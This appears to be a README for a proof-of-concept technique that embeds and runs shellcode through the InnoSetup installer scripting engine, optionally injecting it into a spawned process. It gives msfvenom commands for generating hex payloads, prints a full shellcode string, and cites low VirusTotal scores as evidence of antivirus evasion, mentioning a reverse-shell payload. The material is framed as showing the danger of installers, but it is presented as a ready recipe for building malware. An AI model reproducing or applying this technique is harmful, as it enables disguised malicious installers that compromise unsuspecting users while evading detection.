# InnoSetup Execute Shellcode PoC

![Screenshot 2021-07-21 at 16.05.10.png](https://www.phrozen.io/media/all/Screenshot_2021-07-21_at_16.05.10.png)

This proof of concept demonstrate how to take advantage of InnoSetup Scripting Engine to host local/remote process shellcode payload then execute.

The idea behind this concept is to demonstrate the dangerosity of (self) installers. Not only they can contain malicious programsn, they can also run native code through their scripting engines and evade AV detections because of their natural aspect.

The most difficult part was to understand how to use pointers/refs. Basically from this example, it is possible to create any kind of Malware from scratch (even more complex ones). Feel free to try, if you have any technical questions, feel free to ask for some help.

## Parameters

Parameters are located at the top of the InnoSetup Script File.

 * `SpawnNewProcess`: (1|0) : If set to `1`, payload will be stored and executed from a new process (default: notepad.exe). If set to `0`, the payload will be stored and executed from current InnoSetup Installer Process.
 * `SpawnProcessName`: (STR) : This parameter is only use if `SpawnNewProcess` parameter is set to `1`. Change this value with the desired process you want to spawn.
 * `verbose`: (1|0) : Define whether or not you want to output debug messages (Ex: from DbgView)
 * `Payload`: (HEX_STR) : Define the payload itself in hex format (aligned 2). Use the `-f hex` if using Msfvenom.

## Example

It is now very easy to create your own Setup with your own payload.

Just be sure to have your shellcode encoded in hex string then replace the `Payload` parameter with your payload.

An example with Msfvenom would be:

`msfvenom -p <payload> -a x86 --platform Windows <parameters> EXITFUNC=thread -f hex`

Example: `msfvenom -p windows/exec -a x86 --platform Windows CMD=calc.exe EXITFUNC=thread -f hex`

![Screenshot 2021-07-21 at 16.04.41.png](https://www.phrozen.io/media/all/Screenshot_2021-07-21_at_16.04.41.png)

```
#define Payload "fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6a018d85b20000005068318b6f87ffd5bbe01d2a0a68a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd563616c632e65786500"
```

![Screenshot 2021-07-21 at 16.04.04.png](https://www.phrozen.io/media/all/Screenshot_2021-07-21_at_16.04.04.png)

Adjust other parameters if you want/need then you can build your setup application and enjoy the result.

Notice: If using `SpawnNewProcess`, I would highly recommend using the `ExitProcess` EXITFUNC method instead of `thread` to close the entired spawned process.

## VirusTotal Score (20 JULY 2021)

https://www.virustotal.com/gui/file/697f7d55aa19e9dfaa5b86d8117c4f57adaba1ea252e008d7760e0a192515ac8/detection

3/69 (Mostly generic detection because of file reputation) / Likely FUD

![Screenshot 2021-07-20 at 19.09.53.png](https://www.phrozen.io/media/all/Screenshot_2021-07-20_at_19.09.53.png)

## VirusTotal Score (UPDATE: 21 JULY 2021)

Bellow the result of a setup scan using a reverse shell payload from Msfvenom without any encoding schema:

https://www.virustotal.com/gui/file/2723ba8196721a3fd8b792b195dc20928d53d0e8b21c47da353b894cace847b9/detection

(4/69) - It evade all comonly used AV Software.
